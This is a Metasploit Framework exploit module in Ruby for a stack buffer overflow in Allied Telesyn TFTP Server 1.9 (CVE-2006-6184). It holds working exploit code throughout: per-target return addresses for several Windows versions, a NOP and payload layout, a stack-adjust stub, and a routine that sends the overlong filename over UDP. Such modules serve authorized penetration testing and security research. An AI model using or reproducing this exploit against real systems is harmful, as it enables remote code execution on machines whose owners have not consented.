##
# $Id: attftp_long_filename.rb 11882 2011-03-05 21:00:57Z bannedit $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require \'msf/core\'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Udp

	def initialize(info = {})
		super(update_info(info,
			\'Name\'           => \'Allied Telesyn TFTP Server 1.9 Long Filename Overflow\',
			\'Description\'    => %q{
					This module exploits a stack buffer overflow in AT-TFTP v1.9, by sending a
				request (get/write) for an overly long file name.
			},
			\'Author\'         => [ \'Patrick Webster <patrick[at]aushack.com>\' ],
			\'Version\'        => \'$Revision: 11882 $\',
			\'References\'     =>
				[
					[\'CVE\', \'2006-6184\'],
					[\'OSVDB\', \'11350\'],
					[\'BID\', \'21320\'],
					[\'URL\',\'http://milw0rm.com/exploits/2887\'],
					[\'URL\', \'ftp://guest:guest@ftp.alliedtelesyn.co.uk/pub/utilities/at-tftpd.exe\'],
				],
			\'DefaultOptions\' =>
				{
					\'EXITFUNC\' => \'process\',
				},
			\'Payload\'        =>
				{
					\'Space\'    => 210,
					\'BadChars\' => \"\\x00\",
					\'StackAdjustment\' => -3500,
				},
			\'Platform\'       => \'win\',
			\'Targets\'        =>
				[
				# Patrick - Tested OK w2k sp0, sp4, xp sp 0, xp sp2 - en 2007/08/24
					[ \'Windows NT SP4 English\',   { \'Ret\' => 0x702ea6f7 } ],
					[ \'Windows 2000 SP0 English\', { \'Ret\' => 0x750362c3 } ],
					[ \'Windows 2000 SP1 English\', { \'Ret\' => 0x75031d85 } ],
					[ \'Windows 2000 SP2 English\', { \'Ret\' => 0x7503431b } ],
					[ \'Windows 2000 SP3 English\', { \'Ret\' => 0x74fe1c5a } ],
					[ \'Windows 2000 SP4 English\', { \'Ret\' => 0x75031dce } ],
					[ \'Windows XP SP0/1 English\', { \'Ret\' => 0x71ab7bfb } ],
					[ \'Windows XP SP2 English\',   { \'Ret\' => 0x71ab9372 } ],
					[ \'Windows Server 2003\',      { \'Ret\' => 0x7c86fed3 } ], # ret donated by securityxxxpert
				],
			\'Privileged\'     => false,
			\'DisclosureDate\' => \'Nov 27 2006\'))

		register_options(
			[
				Opt::RPORT(69),
				Opt::LHOST() # Required for stack offset
			], self.class)
	end

	def exploit
		connect_udp

		sploit = \"\\x00\\x02\" + make_nops(25 - datastore[\'LHOST\'].length)
		sploit << payload.encoded
		sploit << [target[\'Ret\']].pack(\'V\') 	# <-- eip = jmp esp. we control it.
		sploit << \"\\x83\\xc4\\x28\\xc3\" 		# <-- esp = add esp 0x28 + retn
		sploit << \"\\x00\" + \"netascii\" + \"\\x00\"

		udp_sock.put(sploit)

		disconnect_udp
	end

end
